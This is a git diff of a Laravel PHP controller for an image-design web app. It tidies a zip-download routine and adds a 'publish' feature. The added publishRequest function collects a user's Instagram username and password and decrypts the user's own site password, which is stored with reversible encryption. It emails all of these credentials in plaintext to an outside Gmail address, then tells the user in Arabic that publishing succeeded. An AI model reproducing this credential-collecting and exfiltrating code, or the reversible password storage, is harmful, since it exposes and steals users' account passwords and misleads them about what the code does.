@@ -11,8 +11,10 @@ use Session;
 use App\UserDesign;
 use App\User;
 use Mail;
+use Crypt;
 use ZipArchive;
 use App\Mail\images;
+use App\Mail\publish;
 
 class HomeController extends Controller
 {
@@ -39,8 +41,7 @@ class HomeController extends Controller
 
         $allImgTrans = Img::Select('id')->where([['imgType','Transparent'],['UserID',$UserID]])->first();
         $allImgBack = Img::Select('id')->where([['imgType','WithBackGound'],['UserID',$UserID]])->first();
-        $allUserDesigns = UserDesign::Select('id')->where('UserID',$UserID)->get();
-
+        $allUserDesigns = UserDesign::Select('id','TheImg')->where('UserID',$UserID)->orderBy('id','DESC')->get();
 
         //Check If user new
 
@@ -72,30 +73,54 @@ class HomeController extends Controller
    function dwonloadAllImages(Request $request) {
 
     $UserID = Auth::id();
-    $allUserDesigns = UserDesign::Select('id')->where('UserID',$UserID)->get();
+    $allUserDesigns = UserDesign::Select('id','TheImg')->where('UserID',$UserID)->get();
 
 
-$files = $allUserDesigns;
+    $files = $allUserDesigns;
 
 
-$tmpFile = tempnam('.', '');
+    $tmpFile = tempnam('.', '');
 
-$zip = new ZipArchive;
-$zip->open($tmpFile, ZipArchive::CREATE);
-foreach ($files as $file) {
-  $imgUrl = "https://rwwj.website/home/fetch_image/". $file->id . ".png";
+    $zip = new ZipArchive;
+    $zip->open($tmpFile, ZipArchive::CREATE);
 
-    $download_file = file_get_contents($imgUrl);
+    foreach ($files as $file) {
+      $imgUrl = "./img/storage/user_designs/". $file->TheImg . ".png";
+      $download_file = file_get_contents($imgUrl);
+      #add it to the zip
+      $zip->addFromString(basename($imgUrl), $download_file);
+    }
 
-    #add it to the zip
-    $zip->addFromString(basename($imgUrl), $download_file);
-}
-$zip->close();
-header('Content-disposition: attachment; filename=file.zip');
-header('Content-Type: application/zip');
-readfile($tmpFile);
-unlink($tmpFile);
+    $zip->close();
+    header('Content-disposition: attachment; filename=file.zip');
+    header('Content-Type: application/zip');
+    readfile($tmpFile);
+    unlink($tmpFile);
 
    }
+
+  /*Start publish*/
+
+   function publish () {
+    return view('user.publish.index');
+   }
+
+   function publishRequest(Request $request) {
+        $instAccount = $request->userAccount;
+        $instPassowrd = $request->PasswordAccount;
+        $userNots = $request->userNots;
+
+        $UserID = Auth::id();
+        $userInformation =  User::Select('email','password')->where('id',$UserID)->first();
+        $userEmail = $userInformation->email;
+        $userPassword = Crypt::decrypt($userInformation->password);
+
+//        dd(Crypt::decrypt($userInformation->password),$userAccount,$PasswordAccount,$userNots);,$instPassowrd,$userNots, $userEmail,$userPassword
+        Mail::to('soouq.sa@gmail.com')->send(new publish($instAccount,$instPassowrd,$userNots, $userEmail,$userPassword));
+        return back()->with('success', 'تم النشر بنجاح');
+
+   }
+
+
 
 }
